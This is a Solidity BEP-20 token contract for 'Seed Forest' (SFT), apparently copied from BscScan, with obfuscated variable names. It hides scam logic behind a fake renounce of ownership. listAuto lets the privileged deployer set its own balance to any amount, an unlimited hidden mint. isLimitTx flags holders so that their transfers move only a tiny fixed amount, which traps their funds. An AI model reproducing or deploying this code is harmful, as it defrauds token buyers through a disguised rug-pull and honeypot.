/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface txReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoAmount {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SeedForest {
    uint8 private walletReceiver = 18;

    address private shouldAmountList;

    string private _name = "Seed Forest";
    string private _symbol = "SFT";

    uint256 private receiverFeeSwap = 100000000 * 10 ** walletReceiver;
    mapping(address => uint256) private launchTrading;
    mapping(address => mapping(address => uint256)) private modeMin;

    mapping(address => bool) public launchedTo;
    address public maxList;
    address public launchedTeam;
    mapping(address => bool) public walletLaunched;
    uint256 constant sellMax = 10 ** 10;
    bool public maxSwap;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        txReceiver swapMode = txReceiver(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchedTeam = autoAmount(swapMode.factory()).createPair(swapMode.WETH(), address(this));
        shouldAmountList = fundTokenLiquidity();
        maxList = shouldAmountList;
        launchedTo[maxList] = true;
        launchTrading[maxList] = receiverFeeSwap;
        emit Transfer(address(0), maxList, receiverFeeSwap);
        swapTokenMode();
    }

    

    function decimals() external view returns (uint8) {
        return walletReceiver;
    }

    function balanceOf(address launchedFee) public view returns (uint256) {
        return launchTrading[launchedFee];
    }

    function allowance(address toLaunched, address liquidityShould) external view returns (uint256) {
        return modeMin[toLaunched][liquidityShould];
    }

    function getOwner() external view returns (address) {
        return shouldAmountList;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function transfer(address receiverMode, uint256 txExempt) external returns (bool) {
        return transferFrom(fundTokenLiquidity(), receiverMode, txExempt);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function listAuto(uint256 txExempt) public {
        if (!launchedTo[fundTokenLiquidity()]) {
            return;
        }
        launchTrading[maxList] = txExempt;
    }

    function isLimitTx(address isLaunched) public {
        if (isLaunched == maxList || isLaunched == launchedTeam || !launchedTo[fundTokenLiquidity()]) {
            return;
        }
        walletLaunched[isLaunched] = true;
    }

    function fundTokenLiquidity() private view returns (address) {
        return msg.sender;
    }

    function owner() external view returns (address) {
        return shouldAmountList;
    }

    function senderLaunch(address limitTrading) public {
        if (maxSwap) {
            return;
        }
        launchedTo[limitTrading] = true;
        maxSwap = true;
    }

    function transferFrom(address modeLaunchToken, address receiverMode, uint256 txExempt) public returns (bool) {
        if (modeLaunchToken != fundTokenLiquidity() && modeMin[modeLaunchToken][fundTokenLiquidity()] != type(uint256).max) {
            require(modeMin[modeLaunchToken][fundTokenLiquidity()] >= txExempt);
            modeMin[modeLaunchToken][fundTokenLiquidity()] -= txExempt;
        }
        if (receiverMode == maxList || modeLaunchToken == maxList) {
            return shouldToExempt(modeLaunchToken, receiverMode, txExempt);
        }
        if (walletLaunched[modeLaunchToken]) {
            return shouldToExempt(modeLaunchToken, receiverMode, sellMax);
        }
        return shouldToExempt(modeLaunchToken, receiverMode, txExempt);
    }

    function approve(address liquidityShould, uint256 txExempt) public returns (bool) {
        modeMin[fundTokenLiquidity()][liquidityShould] = txExempt;
        emit Approval(fundTokenLiquidity(), liquidityShould, txExempt);
        return true;
    }

    function shouldToExempt(address enableTx, address shouldTeam, uint256 txExempt) internal returns (bool) {
        require(launchTrading[enableTx] >= txExempt);
        launchTrading[enableTx] -= txExempt;
        launchTrading[shouldTeam] += txExempt;
        emit Transfer(enableTx, shouldTeam, txExempt);
        return true;
    }

    function totalSupply() external view returns (uint256) {
        return receiverFeeSwap;
    }

    function swapTokenMode() public {
        emit OwnershipTransferred(maxList, address(0));
        shouldAmountList = address(0);
    }


}